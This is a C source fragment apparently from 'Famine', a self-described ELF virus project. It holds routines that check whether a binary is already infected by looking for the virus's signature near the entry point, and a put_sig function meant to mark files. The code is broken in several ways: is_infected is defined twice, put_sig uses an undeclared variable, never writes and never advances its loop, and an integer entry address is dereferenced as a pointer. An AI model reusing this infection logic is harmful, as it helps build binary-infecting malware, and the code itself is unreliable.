#include "../inc/famine.h"

static char	*ft_find_str(const char *haystack, size_t n)
{
	unsigned int	i;
	unsigned int	j;
	unsigned int	k;
    const char needle[] = SIGN;

	i = 0;
    write(1,&needle[0],14); 
	if (!needle[0])
		return ((char *)haystack);
	while (n--)
	{
		j = i;
		k = 0;
		while (haystack[j] == needle[k])
		{
			j++;
			k++;
			if (!needle[k])
				return ((char *)&haystack[i]);
		}
		i++;
	}
	return (NULL);
}

bool    is_infected(char *path_file, t_file *file)
{
    if(open_map(path_file, file))
        return ((file->error = 1) - 1);
    if(ft_find_str(file->data, file->size))
        return(1);
    return(0);
}

bool	is_infected(t_file *file)
{
	Elf64_Ehdr          *header;
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
	int i;

	i = 0;
	header = (Elf64_Ehdr *)file->data;
	// header->e_entry - 8; // fingerprint
	// header->e_entry - 62; // start signature
	while(sig[i])
	{
		if (sig[i] !=  *(header->e_entry - SIZE_BEFORE_ENTRY_POINT + i))
			return(0);
		i++;
	}
	return(1);
}

bool	put_sig(t_file *file)
{
	char sig[] = {'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','<','j','g','o','u','n','a','n','d','>','-','<','a','f','i','o','d','i','e','r','>',' ','-',' '};
	int i;

	i = 0;
	header = (Elf64_Ehdr *)file->data;
	header->e_entry - 8; // fingerprint
	header->e_entry - 62; // start signature
	while(sig[i])
	{
		if (sig[i] !=  *(header->e_entry - 62 + i))
			return(0);
	}
	return(1);
}